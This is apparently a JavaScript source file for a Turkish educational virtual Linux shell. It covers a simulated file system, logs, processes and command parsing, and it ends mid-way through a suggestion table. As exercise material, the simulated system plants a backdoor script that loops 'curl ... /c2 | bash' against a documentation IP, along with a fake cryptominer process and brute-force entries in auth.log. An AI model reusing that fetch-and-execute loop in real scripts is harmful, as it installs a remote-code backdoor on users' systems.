'use strict';
/* Linux Lab sanal kabuk. Sanal dosya sistemi, pipe, yonlendirme, degisken ve script destegi. */

const HOME = '/home/burak';
const USER = 'burak';
const HOSTNAME = 'linuxlab';

const LOGS = {};

LOGS.syslog = [
  'Oct 10 08:00:01 linuxlab systemd[1]: Started Daily apt download activities.',
  'Oct 10 08:00:03 linuxlab CRON[518]: (root) CMD (run-parts /etc/cron.hourly)',
  'Oct 10 08:01:12 linuxlab kernel: [ 12.441] eth0: link up, 1000Mbps, full-duplex',
  'Oct 10 08:02:45 linuxlab dhclient[602]: DHCPACK of 192.168.1.42 from 192.168.1.1',
  'Oct 10 08:03:10 linuxlab systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE',
  'Oct 10 08:03:10 linuxlab systemd[1]: nginx.service: Failed with result exit-code.',
  'Oct 10 08:03:10 linuxlab systemd[1]: Failed to start A high performance web server.',
  'Oct 10 08:05:22 linuxlab kernel: [ 301.120] EXT4-fs warning: mounting fs with errors, running e2fsck is recommended',
  'Oct 10 08:07:40 linuxlab sshd[412]: Server listening on 0.0.0.0 port 2222.',
  'Oct 10 08:10:00 linuxlab CRON[911]: (burak) CMD (/home/burak/scripts/backup.sh)',
  'Oct 10 08:10:01 linuxlab backup[912]: error: source file /home/burak/lab/notlar.txt not found',
  'Oct 10 08:15:33 linuxlab kernel: [ 932.002] Out of memory: Killed process 2211 (java)',
  'Oct 10 08:16:02 linuxlab systemd[1]: Started Session 4 of user burak.',
  'Oct 10 08:20:17 linuxlab ntpd[640]: Error: unable to reach time server 0.pool.ntp.org',
  'Oct 10 08:22:48 linuxlab systemd[1]: Starting Cleanup of Temporary Directories...',
  'Oct 10 08:22:49 linuxlab systemd[1]: Finished Cleanup of Temporary Directories.',
  'Oct 10 08:30:05 linuxlab kernel: [ 1830.77] cryptominer[1337]: segfault at 0 ip 00007f error 4',
  'Oct 10 08:31:00 linuxlab CRON[1401]: (root) CMD (command -v debian-sa1 > /dev/null)',
  'Oct 10 08:35:12 linuxlab dockerd[777]: level=warning msg="no swap limit support"',
  'Oct 10 08:40:44 linuxlab systemd-resolved[588]: Using degraded feature set UDP instead of EDNS0',
  'Oct 10 08:45:09 linuxlab ERROR postfix/smtp[1520]: connect to mail.example.com[203.0.113.9]:25: Connection timed out',
  'Oct 10 08:50:00 linuxlab systemd[1]: Reached target Timers.',
].join('\n') + '\n';

LOGS.auth = [
  'Oct 10 03:12:01 linuxlab sshd[2001]: Failed password for invalid user admin from 203.0.113.45 port 52211 ssh2',
  'Oct 10 03:12:04 linuxlab sshd[2001]: Failed password for invalid user admin from 203.0.113.45 port 52213 ssh2',
  'Oct 10 03:12:07 linuxlab sshd[2003]: Failed password for root from 203.0.113.45 port 52219 ssh2',
  'Oct 10 03:15:40 linuxlab sshd[2010]: Failed password for invalid user oracle from 198.51.100.23 port 40122 ssh2',
  'Oct 10 03:15:44 linuxlab sshd[2010]: Failed password for root from 198.51.100.23 port 40130 ssh2',
  'Oct 10 03:20:11 linuxlab sshd[2022]: Failed password for root from 203.0.113.45 port 52301 ssh2',
  'Oct 10 03:20:15 linuxlab sshd[2022]: Failed password for root from 203.0.113.45 port 52305 ssh2',
  'Oct 10 04:01:00 linuxlab sshd[2100]: Accepted publickey for burak from 192.168.1.10 port 51000 ssh2',
  'Oct 10 04:01:00 linuxlab sshd[2100]: pam_unix(sshd:session): session opened for user burak',
  'Oct 10 04:33:21 linuxlab sshd[2150]: Failed password for invalid user test from 192.0.2.77 port 33012 ssh2',
  'Oct 10 04:33:25 linuxlab sshd[2150]: Failed password for root from 192.0.2.77 port 33020 ssh2',
  'Oct 10 05:02:13 linuxlab sudo:    burak : TTY=pts/0 ; PWD=/home/burak ; USER=root ; COMMAND=/usr/bin/apt update',
  'Oct 10 05:47:52 linuxlab sshd[2201]: Failed password for root from 203.0.113.45 port 53001 ssh2',
  'Oct 10 05:47:55 linuxlab sshd[2201]: Failed password for invalid user admin from 203.0.113.45 port 53007 ssh2',
  'Oct 10 06:10:09 linuxlab sshd[2300]: Failed password for deploy from 198.51.100.23 port 41200 ssh2',
  'Oct 10 06:10:30 linuxlab sshd[2300]: Accepted password for deploy from 198.51.100.23 port 41210 ssh2',
  'Oct 10 06:11:02 linuxlab sshd[2300]: pam_unix(sshd:session): session opened for user deploy',
  'Oct 10 06:12:40 linuxlab sudo:   deploy : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash',
  'Oct 10 07:00:01 linuxlab sshd[2400]: Failed password for root from 192.0.2.77 port 33100 ssh2',
  'Oct 10 07:30:44 linuxlab sshd[2450]: Failed password for invalid user admin from 198.51.100.23 port 41300 ssh2',
].join('\n') + '\n';

LOGS.access = [
  '192.168.1.10 - - [10/Oct/2026:09:00:01 +0200] "GET / HTTP/1.1" 200 612',
  '192.168.1.10 - - [10/Oct/2026:09:00:02 +0200] "GET /favicon.ico HTTP/1.1" 404 153',
  '203.0.113.45 - - [10/Oct/2026:09:01:10 +0200] "GET /wp-login.php HTTP/1.1" 404 153',
  '203.0.113.45 - - [10/Oct/2026:09:01:11 +0200] "GET /admin HTTP/1.1" 404 153',
  '203.0.113.45 - - [10/Oct/2026:09:01:12 +0200] "GET /.env HTTP/1.1" 404 153',
  '192.168.1.22 - - [10/Oct/2026:09:05:40 +0200] "GET /api/status HTTP/1.1" 200 48',
  '192.168.1.22 - - [10/Oct/2026:09:05:41 +0200] "POST /api/login HTTP/1.1" 401 32',
  '192.168.1.22 - - [10/Oct/2026:09:05:45 +0200] "POST /api/login HTTP/1.1" 200 210',
  '198.51.100.23 - - [10/Oct/2026:09:10:00 +0200] "GET /phpmyadmin HTTP/1.1" 404 153',
  '192.168.1.10 - - [10/Oct/2026:09:12:30 +0200] "GET /docs HTTP/1.1" 301 169',
  '192.168.1.10 - - [10/Oct/2026:09:12:31 +0200] "GET /docs/ HTTP/1.1" 200 2048',
  '192.168.1.30 - - [10/Oct/2026:09:20:05 +0200] "GET /api/report HTTP/1.1" 500 87',
  '192.168.1.30 - - [10/Oct/2026:09:20:09 +0200] "GET /api/report HTTP/1.1" 500 87',
  '203.0.113.45 - - [10/Oct/2026:09:25:00 +0200] "GET /backup.zip HTTP/1.1" 404 153',
  '192.168.1.22 - - [10/Oct/2026:09:30:12 +0200] "GET /api/status HTTP/1.1" 200 48',
  '192.168.1.10 - - [10/Oct/2026:09:41:51 +0200] "GET / HTTP/1.1" 304 0',
].join('\n') + '\n';

LOGS.nginxConf = [
  'user www-data;',
  'worker_processes auto;',
  'pid /run/nginx.pid;',
  '',
  'events {',
  '    worker_connections 768;',
  '}',
  '',
  'http {',
  '    sendfile on;',
  '    server {',
  '        listen 80q;',
  '        server_name linuxlab;',
  '        root /var/www/html;',
  '        index index.html;',
  '    }',
  '}',
].join('\n') + '\n';

function mkdir(children = {}, mode = 0o755, owner = 'root') {
  return { t: 'd', c: children, m: mode, o: owner, ts: Date.now() };
}
function mkfile(content = '', mode = 0o644, owner = 'root') {
  return { t: 'f', d: content, m: mode, o: owner, ts: Date.now() };
}

function defaultFS() {
  const U = USER;
  const binNames = ['bash', 'sh', 'ls', 'cat', 'echo', 'grep', 'sort', 'uniq', 'cut', 'tr', 'sed', 'awk', 'head', 'tail', 'wc',
    'cp', 'mv', 'rm', 'mkdir', 'rmdir', 'touch', 'chmod', 'chown', 'find', 'ps', 'kill', 'ping', 'ip', 'ss', 'curl', 'nano',
    'vim', 'sudo', 'systemctl', 'journalctl', 'tee', 'date', 'whoami', 'id', 'uname', 'tree', 'dig', 'top', 'free', 'df', 'du'];
  const bin = {};
  binNames.forEach(n => { bin[n] = mkfile('\x7fELF binary', 0o755); });
  return mkdir({
    bin: mkdir({}),
    usr: mkdir({ bin: mkdir(bin), share: mkdir({}) }),
    etc: mkdir({
      hostname: mkfile(HOSTNAME + '\n'),
      hosts: mkfile('127.0.0.1\tlocalhost\n127.0.1.1\tlinuxlab\n::1\tlocalhost ip6-localhost\n'),
      passwd: mkfile([
        'root:x:0:0:root:/root:/bin/bash',
        'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin',
        'bin:x:2:2:bin:/bin:/usr/sbin/nologin',
        'sys:x:3:3:sys:/dev:/usr/sbin/nologin',
        'sync:x:4:65534:sync:/bin:/bin/sync',
        'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
        'backup:x:34:34:backup:/var/backups:/usr/sbin/nologin',
        'sshd:x:110:65534::/run/sshd:/usr/sbin/nologin',
        'postgres:x:112:120:PostgreSQL:/var/lib/postgresql:/bin/bash',
        'burak:x:1000:1000:Burak,,,:/home/burak:/bin/bash',
        'deploy:x:1001:1001::/home/deploy:/bin/sh',
      ].join('\n') + '\n'),
      shadow: mkfile('root:$6$Zx9...:19500:0:99999:7:::\nburak:$6$k2P...:19500:0:99999:7:::\nFLAG{root_okur_sen_okuyamazsin}\n', 0o640),
      'os-release': mkfile('PRETTY_NAME="Ubuntu 24.04 LTS"\nNAME="Ubuntu"\nVERSION_ID="24.04"\nID=ubuntu\n'),
      nginx: mkdir({ 'nginx.conf': mkfile(LOGS.nginxConf) }),
      ssh: mkdir({ sshd_config: mkfile('Port 2222\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\n') }),
      'resolv.conf': mkfile('nameserver 192.168.1.1\nsearch home.lan\n'),
    }),
    home: mkdir({
      burak: mkdir({
        '.bashrc': mkfile('# ~/.bashrc\nexport EDITOR=nano\nalias ll="ls -la"\n', 0o644, U),
        '.gizli_not': mkfile('Tebrikler, gizli dosyalari buldun. Linux\'ta nokta ile baslayan dosyalar gizlidir.\n', 0o644, U),
        'notes.txt': mkfile('TODO: nginx config duzelt\nTODO: yedekleme scriptini yaz\nDONE: ssh portunu degistir\nTODO: auth.log incele\nfikir: grep ile log analizi\n', 0o644, U),
        projects: mkdir({
          'webapp': mkdir({ 'app.py': mkfile('from flask import Flask\napp = Flask(__name__)\n\n@app.route("/")\ndef index():\n    return "Merhaba"\n', 0o644, U), 'README.md': mkfile('# webapp\nKucuk bir Flask uygulamasi.\n', 0o644, U) }, 0o755, U),
          'ansible': mkdir({ 'site.yml': mkfile('- hosts: all\n  tasks:\n    - name: ping\n      ping:\n', 0o644, U) }, 0o755, U),
        }, 0o755, U),
        Documents: mkdir({ 'rapor.txt': mkfile('Q3 raporu\nUptime: 99.95%\nIncident: 2\n', 0o644, U) }, 0o755, U),
        data: mkdir({
          'scores.txt': mkfile('ayse 87\nmehmet 92\nzeynep 78\nali 95\nelif 88\nmert 61\ncan 92\nderya 99\nkerem 70\n', 0o644, U),
          'cities.csv': mkfile('city,country,population\nAmsterdam,NL,921402\nIstanbul,TR,15655924\nPurmerend,NL,93000\nRotterdam,NL,664311\nAnkara,TR,5803482\nUtrecht,NL,374238\nIzmir,TR,4479525\n', 0o644, U),
          'fruits.txt': mkfile('elma\nmuz\nelma\narmut\nkiraz\nmuz\nelma\nincir\narmut\n', 0o644, U),
        }, 0o755, U),
        scripts: mkdir({
          'hello.sh': mkfile('#!/bin/bash\n# ilk scriptin\necho "Merhaba, script dunyasi!"\necho "Kullanici: $USER"\necho "Konum: $(pwd)"\n', 0o644, U),
        }, 0o755, U),
      }, 0o755, U),
      deploy: mkdir({}, 0o750, 'deploy'),
    }),
    root: mkdir({ 'secret.txt': mkfile('root dizinine hosgeldin.\n', 0o600) }, 0o700),
    tmp: mkdir({
      'session.lock': mkfile('', 0o644, U),
      '.cache_x': mkdir({ '.backdoor.sh': mkfile('#!/bin/bash\nwhile true; do curl -s http://203.0.113.45/c2 | bash; sleep 60; done\n', 0o777, 'www-data') }, 0o777, 'www-data'),
    }, 0o777),
    var: mkdir({
      log: mkdir({
        syslog: mkfile(LOGS.syslog, 0o644),
        'auth.log': mkfile(LOGS.auth, 0o644),
        nginx: mkdir({ 'access.log': mkfile(LOGS.access), 'error.log': mkfile('2026/10/10 08:03:10 [emerg] 901#901: invalid port in "80q" of the "listen" directive in /etc/nginx/nginx.conf:12\n') }),
      }),
      www: mkdir({ html: mkdir({ 'index.html': mkfile('<h1>Welcome to nginx on linuxlab!</h1>\n') }) }),
    }),
    proc: mkdir({
      cpuinfo: mkfile('processor\t: 0\nmodel name\t: Virtual CPU @ 2.40GHz\ncpu cores\t: 2\n'),
      meminfo: mkfile('MemTotal:        4028340 kB\nMemFree:          812344 kB\nMemAvailable:    2310220 kB\n'),
      version: mkfile('Linux version 6.8.0-45-generic (buildd@lcy02) gcc 13.2.0\n'),
    }),
  });
}

function defaultProcs() {
  return [
    { pid: 1, user: 'root', cpu: 0.0, mem: 0.3, cmd: '/sbin/init' },
    { pid: 412, user: 'root', cpu: 0.0, mem: 0.2, cmd: 'sshd: /usr/sbin/sshd -D' },
    { pid: 518, user: 'root', cpu: 0.0, mem: 0.1, cmd: '/usr/sbin/cron -f' },
    { pid: 588, user: 'systemd+', cpu: 0.1, mem: 0.3, cmd: '/lib/systemd/systemd-resolved' },
    { pid: 733, user: 'burak', cpu: 0.0, mem: 0.1, cmd: '-bash' },
    { pid: 777, user: 'root', cpu: 0.4, mem: 2.1, cmd: '/usr/bin/dockerd' },
    { pid: 1024, user: 'burak', cpu: 0.2, mem: 0.8, cmd: 'python3 -m http.server 8000' },
    { pid: 1337, user: 'www-data', cpu: 97.8, mem: 12.4, cmd: './cryptominer --pool 203.0.113.45:3333' },
  ];
}

function defaultServices() {
  return { nginx: 'failed', sshd: 'active', ssh: 'active', cron: 'active', docker: 'active' };
}

/* ---------- yardimcilar ---------- */

function lines(s) {
  if (!s) return [];
  const a = s.split('\n');
  if (a[a.length - 1] === '') a.pop();
  return a;
}
function join(a) { return a.length ? a.join('\n') + '\n' : ''; }
function ok(out = '') { return { out, err: '', code: 0 }; }
function fail(err, code = 1) { return { out: '', err: err.endsWith('\n') ? err : err + '\n', code }; }

function modeStr(n) {
  const t = n.t === 'd' ? 'd' : '-';
  const m = n.m;
  const r = (b, c) => (m & b ? c : '-');
  return t + r(0o400, 'r') + r(0o200, 'w') + r(0o100, 'x') + r(0o40, 'r') + r(0o20, 'w') + r(0o10, 'x') + r(0o4, 'r') + r(0o2, 'w') + r(0o1, 'x');
}

function parseOpts(args, valued = '') {
  const flags = new Set(); const vals = {}; const rest = [];
  for (let i = 0; i < args.length; i++) {
    const a = args[i];
    if (a === '--') { rest.push(...args.slice(i + 1)); break; }
    if (a.startsWith('--') && a.length > 2) { flags.add(a); continue; }
    if (a.startsWith('-') && a.length > 1 && !/^-\d/.test(a)) {
      for (let j = 1; j < a.length; j++) {
        const ch = a[j];
        if (valued.includes(ch)) {
          const v = a.slice(j + 1) || args[++i];
          vals[ch] = v;
          break;
        }
        flags.add(ch);
      }
      continue;
    }
    rest.push(a);
  }
  return { flags, vals, rest };
}

function globToRe(p) {
  let re = '';
  for (const ch of p) {
    if (ch === '*') re += '[^/]*';
    else if (ch === '?') re += '[^/]';
    else re += ch.replace(/[.+^${}()|[\]\\]/g, '\\$&');
  }
  return new RegExp('^' + re + '$');
}

function fmtSize(n, human) {
  if (!human) return String(n);
  if (n < 1024) return n + '';
  if (n < 1048576) return (n / 1024).toFixed(1) + 'K';
  return (n / 1048576).toFixed(1) + 'M';
}

function fmtDate(ts) {
  const d = new Date(ts);
  const mo = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'][d.getMonth()];
  return `${mo} ${String(d.getDate()).padStart(2, ' ')} ${String(d.getHours()).padStart(2, '0')}:${String(d.getMinutes()).padStart(2, '0')}`;
}

/* Ust seviye bolme, tirnak ve $( ) icini atlar */
function splitTop(str, ops) {
  const out = []; let cur = ''; let q = null; let depth = 0; let prevOp = null;
  const sorted = [...ops].sort((a, b) => b.length - a.length);
  for (let i = 0; i < str.length; i++) {
    const ch = str[i];
    if (q) {
      cur += ch;
      if (ch === '\\' && q === '"' && i + 1 < str.length) { cur += str[++i]; continue; }
      if (ch === q) q = null;
      continue;
    }
    if (ch === '\\' && i + 1 < str.length) { cur += ch + str[++i]; continue; }
    if (ch === "'" || ch === '"') { q = ch; cur += ch; continue; }
    if (ch === '$' && str[i + 1] === '(') { depth++; cur += '$('; i++; continue; }
    if (ch === '(' && depth > 0) { depth++; cur += ch; continue; }
    if (ch === ')' && depth > 0) { depth--; cur += ch; continue; }
    if (depth === 0) {
      const op = sorted.find(o => str.startsWith(o, i));
      if (op) {
        if (op === '|' && str[i + 1] === '|') { cur += '||'; i++; continue; }
        if (op === '&' && (str[i + 1] === '&' || str[i - 1] === '>' || str[i + 1] === '>')) { cur += ch; continue; }
        out.push({ text: cur, prevOp });
        prevOp = op; cur = ''; i += op.length - 1;
        continue;
      }
    }
    cur += ch;
  }
  out.push({ text: cur, prevOp });
  return out;
}

/* ---------- Shell ---------- */

class Shell {
  constructor(saved) {
    this.reset();
    if (saved) {
      try {
        const s = typeof saved === 'string' ? JSON.parse(saved) : saved;
        if (s.fs) this.root = s.fs;
        if (s.cwd) this.cwd = s.cwd;
        if (s.env) Object.assign(this.env, s.env);
        if (s.procs) this.procs = s.procs;
        if (s.services) this.services = s.services;
        if (s.history) this.history = s.history;
        if (s.aliases) this.aliases = s.aliases;
      } catch (e) { /* bozuk kayit, varsayilan kullan */ }
    }
  }

  reset() {
    this.root = defaultFS();
    this.cwd = HOME;
    this.env = { USER, HOME, SHELL: '/bin/bash', PATH: '/usr/local/bin:/usr/bin:/bin', HOSTNAME, LANG: 'tr_TR.UTF-8', OLDPWD: HOME, EDITOR: 'nano' };
    this.procs = defaultProcs();
    this.services = defaultServices();
    this.history = [];
    this.aliases = { ll: 'ls -la', la: 'ls -A' };
    this.isRoot = false;
    this.lastCode = 0;
    this.lastSubmit = null;
    this.positional = [];
    this.depth = 0;
  }

  serialize() {
    return JSON.stringify({ fs: this.root, cwd: this.cwd, env: this.env, procs: this.procs, services: this.services, history: this.history.slice(-300), aliases: this.aliases });
  }

  get user() { return this.isRoot ? 'root' : USER; }

  prompt() {
    let p = this.cwd;
    if (p === HOME) p = '~'; else if (p.startsWith(HOME + '/')) p = '~' + p.slice(HOME.length);
    return { user: USER + '@' + HOSTNAME, path: p, sym: '$' };
  }

  resolve(path) {
    if (path === undefined || path === null || path === '') return this.cwd;
    if (path === '~') path = HOME;
    else if (path.startsWith('~/')) path = HOME + path.slice(1);
    const parts = (path.startsWith('/') ? path : this.cwd + '/' + path).split('/');
    const out = [];
    for (const p of parts) {
      if (!p || p === '.') continue;
      if (p === '..') out.pop(); else out.push(p);
    }
    return '/' + out.join('/');
  }

  node(abs) {
    if (abs === '/') return this.root;
    let n = this.root;
    for (const p of abs.split('/').slice(1)) {
      if (!n || n.t !== 'd') return null;
      n = n.c[p];
    }
    return n || null;
  }

  parent(abs) {
    const i = abs.lastIndexOf('/');
    const pp = abs.slice(0, i) || '/';
    return { dir: this.node(pp), name: abs.slice(i + 1), ppath: pp };
  }

  canRead(n) {
    if (this.isRoot) return true;
    if (n.o === USER) return !!(n.m & 0o400);
    return !!(n.m & 0o004);
  }
  canWrite(n) {
    if (this.isRoot) return true;
    if (n.o === USER) return !!(n.m & 0o200);
    return !!(n.m & 0o002);
  }
  canExec(n) {
    if (this.isRoot) return !!(n.m & 0o111);
    if (n.o === USER) return !!(n.m & 0o100);
    return !!(n.m & 0o001);
  }

  /* dosya okuma, hata mesajini cmd ile uretir */
  readFile(path, cmd) {
    const abs = this.resolve(path);
    const n = this.node(abs);
    if (!n) return { err: `${cmd}: ${path}: No such file or directory` };
    if (n.t === 'd') return { err: `${cmd}: ${path}: Is a directory` };
    if (!this.canRead(n)) return { err: `${cmd}: ${path}: Permission denied` };
    return { data: n.d };
  }

  writeFile(path, data, append, cmd) {
    const abs = this.resolve(path);
    if (abs === '/dev/null') return null;
    let n = this.node(abs);
    if (n && n.t === 'd') return `${cmd}: ${path}: Is a directory`;
    if (n) {
      if (!this.canWrite(n)) return `${cmd}: ${path}: Permission denied`;
      n.d = append ? n.d + data : data;
      n.ts = Date.now();
      return null;
    }
    const { dir, name } = this.parent(abs);
    if (!dir || dir.t !== 'd') return `${cmd}: ${path}: No such file or directory`;
    if (!this.canWrite(dir)) return `${cmd}: ${path}: Permission denied`;
    dir.c[name] = mkfile(data, 0o644, this.user);
    return null;
  }

  /* ---------- tokenizer ---------- */

  expandDollar(s, i) {
    // s[i] === '$'
    const nx = s[i + 1];
    if (nx === '(') {
      let depth = 1; let j = i + 2; let q = null;
      for (; j < s.length; j++) {
        const c = s[j];
        if (q) { if (c === q) q = null; continue; }
        if (c === "'" || c === '"') { q = c; continue; }
        if (c === '(') depth++;
        if (c === ')') { depth--; if (depth === 0) break; }
      }
      const inner = s.slice(i + 2, j);
      const buf = [];
      if (this.depth < 8) {
        this.depth++;
        this.execList(inner, (t, cls) => { if (cls !== 'err') buf.push(t); });
        this.depth--;
      }
      return [buf.join('').replace(/\n+$/, '').replace(/\n/g, ' '), j + 1];
    }
    if (nx === '{') {
      const j = s.indexOf('}', i);
      if (j < 0) return ['$', i + 1];
      return [this.getVar(s.slice(i + 2, j)), j + 1];
    }
    if (nx === '?') return [String(this.lastCode), i + 2];
    if (nx === '$') return ['733', i + 2];
    if (nx === '#') return [String(this.positional.length), i + 2];
    if (nx === '@' || nx === '*') return [this.positional.join(' '), i + 2];
    if (/\d/.test(nx || '')) return [this.positional[Number(nx) - 1] || (nx === '0' ? 'bash' : ''), i + 2];
    const m = /^[A-Za-z_][A-Za-z0-9_]*/.exec(s.slice(i + 1));
    if (!m) return ['$', i + 1];
    return [this.getVar(m[0]), i + 1 + m[0].length];
  }

  getVar(name) {
    if (name === 'PWD') return this.cwd;
    if (name === 'RANDOM') return String(Math.floor(Math.random() * 32768));
    return this.env[name] !== undefined ? this.env[name] : '';
  }

  tokenize(s) {
    const words = []; const redirs = [];
    let cur = ''; let has = false; let glob = false; let i = 0;
    let pendingRedir = null;
    const push = () => {
      if (!has) return;
      if (pendingRedir) { redirs.push({ op: pendingRedir, target: cur }); pendingRedir = null; }
      else words.push({ w: cur, glob });
      cur = ''; has = false; glob = false;
    };
    while (i < s.length) {
      const ch = s[i];
      if (ch === ' ' || ch === '\t' || ch === '\n') { push(); i++; continue; }
      if (ch === "'") {
        const j = s.indexOf("'", i + 1);
        const end = j < 0 ? s.length : j;
        cur += s.slice(i + 1, end); has = true; i = end + 1; continue;
      }
      if (ch === '"') {
        i++; has = true;
        while (i < s.length && s[i] !== '"') {
          if (s[i] === '\\' && i + 1 < s.length && '"$\\`'.includes(s[i + 1])) { cur += s[i + 1]; i += 2; continue; }
          if (s[i] === '$') { const [v, ni] = this.expandDollar(s, i); cur += v; i = ni; continue; }
          cur += s[i]; i++;
        }
        i++; continue;
      }
      if (ch === '\\') { if (i + 1 < s.length) { cur += s[i + 1]; has = true; } i += 2; continue; }
      if (ch === '$') { const [v, ni] = this.expandDollar(s, i); cur += v; has = has || v !== '' || true; i = ni; continue; }
      if (ch === '~' && !has && (s[i + 1] === undefined || s[i + 1] === '/' || s[i + 1] === ' ')) { cur += HOME; has = true; i++; continue; }
      if (ch === '2' && !has && s[i + 1] === '>') {
        push();
        if (s.startsWith('2>&1', i)) { redirs.push({ op: '2>&1' }); i += 4; continue; }
        pendingRedir = '2>'; i += 2; continue;
      }
      if (ch === '&' && s[i + 1] === '>') { push(); pendingRedir = '&>'; i += 2; continue; }
      if (ch === '>' || ch === '<') {
        push();
        if (s.startsWith('>>', i)) { pendingRedir = '>>'; i += 2; }
        else { pendingRedir = ch; i++; }
        continue;
      }
      if (ch === '*' || ch === '?') glob = true;
      cur += ch; has = true; i++;
    }
    push();
    return { words, redirs };
  }

  expandGlob(word) {
    const p = word;
    const slash = p.lastIndexOf('/');
    const dirPart = slash >= 0 ? p.slice(0, slash + 1) : '';
    const base = slash >= 0 ? p.slice(slash + 1) : p;
    if (/[*?]/.test(dirPart)) return [p];
    const dirAbs = this.resolve(dirPart || '.');
    const d = this.node(dirAbs);
    if (!d || d.t !== 'd') return [p];
    const re = globToRe(base);
    const names = Object.keys(d.c).filter(n => re.test(n) && (base.startsWith('.') || !n.startsWith('.'))).sort();
    return names.length ? names.map(n => dirPart + n) : [p];
  }

  parseCmd(text) {
    const { words, redirs } = this.tokenize(text);
    const argv = [];
    for (const w of words) {
      if (w.glob) argv.push(...this.expandGlob(w.w)); else argv.push(w.w);
    }
    const assigns = {};
    while (argv.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(argv[0])) {
      const a = argv.shift();
      const k = a.indexOf('=');
      assigns[a.slice(0, k)] = a.slice(k + 1);
    }
    return { argv, redirs, assigns };
  }

  /* ---------- calistirma ---------- */

  run(line) {
    const chunks = [];
    const write = (text, cls) => { if (text) chunks.push({ text, cls: cls || '' }); };
    this.ui = {};
    line = line.trim();
    if (!line) return { chunks, ui: this.ui };
    if (!line.startsWith(' ')) this.history.push(line);
    try {
      this.execList(line, write);
    } catch (e) {
      write('bash: ' + (e.message || e) + '\n', 'err');
      this.lastCode = 1;
    }
    this.isRoot = false;
    return { chunks, ui: this.ui };
  }

  execList(line, write) {
    const segs = splitTop(line, ['&&', '||', ';']);
    let code = this.lastCode;
    for (const s of segs) {
      if (!s.text.trim()) continue;
      if (s.prevOp === '&&' && code !== 0) continue;
      if (s.prevOp === '||' && code === 0) continue;
      code = this.execPipeline(s.text.trim(), write);
      this.lastCode = code;
    }
    return code;
  }

  execPipeline(text, write) {
    const parts = splitTop(text, ['|']).map(p => p.text);
    let stdin = null; let code = 0; let rich = null;
    for (let k = 0; k < parts.length; k++) {
      const isLast = k === parts.length - 1;
      let { argv, redirs, assigns } = this.parseCmd(parts[k]);
      if (argv.length && this.aliases[argv[0]] && this.depth < 4) {
        const ex = this.parseCmd(this.aliases[argv[0]]);
        argv = ex.argv.concat(argv.slice(1));
      }
      let input = stdin;
      for (const r of redirs) {
        if (r.op === '<') {
          const f = this.readFile(r.target, 'bash');
          if (f.err) { write(f.err + '\n', 'err'); return 1; }
          input = f.data;
        }
      }
      const res = this.execSimple(argv, input, assigns);
      code = res.code;
      let out = res.out || '';
      let err = res.err || '';
      let outRedirected = false;
      for (const r of redirs) {
        if (r.op === '>' || r.op === '>>' || r.op === '&>') {
          const data = r.op === '&>' ? out + err : out;
          if (r.op === '&>') err = '';
          const e = this.writeFile(r.target, data, r.op === '>>', 'bash');
          if (e) { write(e + '\n', 'err'); code = 1; }
          out = ''; outRedirected = true;
        } else if (r.op === '2>') {
          if (this.resolve(r.target) !== '/dev/null') this.writeFile(r.target, err, false, 'bash');
          err = '';
        } else if (r.op === '2>&1') {
          out = out + err; err = '';
        }
      }
      if (err) write(err, 'err');
      stdin = out;
      rich = isLast && !outRedirected ? res.rich : null;
    }
    if (rich) rich.forEach(r => write(r.text, r.cls));
    else if (stdin) write(stdin);
    return code;
  }

  execSimple(argv, stdin, assigns) {
    if (!argv.length) {
      Object.assign(this.env, assigns);
      return ok();
    }
    const saved = {};
    for (const k of Object.keys(assigns)) { saved[k] = this.env[k]; this.env[k] = assigns[k]; }
    try {
      const name = argv[0];
      const args = argv.slice(1);
      if (name.includes('/')) return this.runScript(name, args, true);
      const fn = COMMANDS[name];
      if (!fn) {
        const hint = SUGGEST[name] ? `\nIpucu: ${SUGGEST[name]}` : '';
        return fail(`${name}: command not found${hint}`, 127);
      }
      return fn.call(this, args, stdin == null ? null : stdin) || ok();
    } finally {
      for (const k of Object.keys(saved)) { if (saved[k] === undefined) delete this.env[k]; else this.env[k] = saved[k]; }
    }
  }

  runScript(path, args, needExec) {
    const abs = this.resolve(path);
    const n = this.node(abs);
    if (!n) return fail(`bash: ${path}: No such file or directory`, 127);
    if (n.t === 'd') return fail(`bash: ${path}: Is a directory`, 126);
    if (!this.canRead(n) || (needExec && !this.canExec(n))) return fail(`bash: ${path}: Permission denied`, 126);
    if (n.d.startsWith('\x7fELF')) return fail(`${path}: binary calistirma bu labda desteklenmiyor`);
    if (this.depth > 6) return fail('bash: maximum recursion');
    const out = []; const err = [];
    const savedPos = this.positional;
    this.positional = args;
    this.depth++;
    let code = 0;
    for (const raw of lines(n.d)) {
      const l = raw.trim();
      if (!l || l.startsWith('#')) continue;
      code = this.execList(l, (t, cls) => (cls === 'err' ? err : out).push(t));
      if (/^exit\b/.test(l)) break;
    }
    this.depth--;
    this.positional = savedPos;
    return { out: out.join(''), err: err.join(''), code };
  }

  listDir(abs) {
    const d = this.node(abs);
    if (!d || d.t !== 'd') return [];
    return Object.keys(d.c).sort();
  }

  complete(text) {
    const parts = text.split(/\s+/);
    const last = parts[parts.length - 1];
    let cands;
    if (parts.length === 1) {
      cands = Object.keys(COMMANDS).filter(c => c.startsWith(last));
      if (cands.length === 1) return text.slice(0, text.length - last.length) + cands[0] + ' ';
    } else {
      const slash = last.lastIndexOf('/');
      const dirPart = slash >= 0 ? last.slice(0, slash + 1) : '';
      const base = slash >= 0 ? last.slice(slash + 1) : last;
      const abs = this.resolve(dirPart || '.');
      cands = this.listDir(abs).filter(n => n.startsWith(base) && (base.startsWith('.') || !n.startsWith('.')));
      if (cands.length === 1) {
        const full = dirPart + cands[0];
        const n = this.node(this.resolve(full));
        return text.slice(0, text.length - last.length) + full + (n && n.t === 'd' ? '/' : ' ');
      }
      if (cands.length > 1) {
        let pre = cands[0];
        for (const c of cands) while (!c.startsWith(pre)) pre = pre.slice(0, -1);
        if (pre.length > base.length) return text.slice(0, text.length - last.length) + dirPart + pre;
      }
    }
    return { options: cands || [] };
  }
}

/* ---------- komutlar ---------- */

const SUGGEST = {
  dir: 'Linux\'ta ls kullanilir',
  cls: 'ekrani temizlemek icin clear',
  ipconfig: 'Linux\'ta ip addr kullanilir',
